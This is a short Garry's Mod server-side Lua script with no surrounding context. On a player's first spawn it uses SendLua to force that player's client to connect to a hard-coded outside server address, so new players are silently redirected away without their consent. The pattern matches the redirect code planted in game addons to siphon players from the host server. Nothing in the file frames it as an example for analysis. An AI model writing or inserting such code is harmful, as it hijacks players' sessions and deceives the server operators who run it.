if SERVER then 

local ip="94.23.180.165:27015" 

hook.Add('PlayerInitialSpawn','Redirect',function(ply) 

if(ply:GetPData("tutor_ever","0")!="1")then

timer.Simple(2,function() 
ply:SendLua([[LocalPlayer():ConCommand("connect ]]..tostring(ip)..[[")]]) 

end) 

end
end)
end